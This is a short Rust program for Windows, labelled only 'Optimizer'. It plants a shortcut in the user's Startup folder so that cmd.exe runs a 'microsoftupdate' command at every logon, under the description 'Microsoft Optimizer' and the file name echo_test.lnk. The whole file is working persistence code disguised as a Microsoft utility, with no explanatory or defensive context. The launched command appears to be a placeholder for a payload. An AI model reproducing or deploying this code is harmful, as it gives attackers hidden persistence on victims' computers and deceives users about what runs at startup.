#![allow(non_upper_case_globals)]
//Optimizer
use windows::{
    core::*,
    Win32::Foundation::HANDLE,
    Win32::System::Com::*,
    Win32::UI::Shell::*,
};

const FOLDERID_Startup: GUID = GUID::from_u128(0xB97D20BB_F46A_4C97_BA10_5E3608430854);
const CLSID_ShellLink: GUID = GUID::from_u128(0x00021401_0000_0000_C000_000000000046);

fn main() -> Result<()> {
    unsafe {

        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;

        let shell_link: IShellLinkW = CoCreateInstance(&CLSID_ShellLink, None, CLSCTX_INPROC_SERVER)?;

        shell_link.SetPath(w!("C:\\Windows\\System32\\cmd.exe"))?;

        shell_link.SetArguments(w!("/c microsoftupdate"))?;

        shell_link.SetDescription(w!("Microsoft Optimizer"))?;

        let persist_file: IPersistFile = shell_link.cast()?;

        let path_ptr = SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DEFAULT, HANDLE(0))?;

        let startup_path = path_ptr.to_string().map_err(|_| Error::from(HRESULT(0x80004005u32 as i32)))?;

        CoTaskMemFree(Some(path_ptr.0 as _));

        let lnk_path = format!("{}\\echo_test.lnk", startup_path);
        let lnk_path_wide: Vec<u16> = lnk_path.encode_utf16().chain(std::iter::once(0)).collect();
		
        persist_file.Save(PCWSTR(lnk_path_wide.as_ptr()), true)?;

        CoUninitialize();
    }
    Ok(())
}
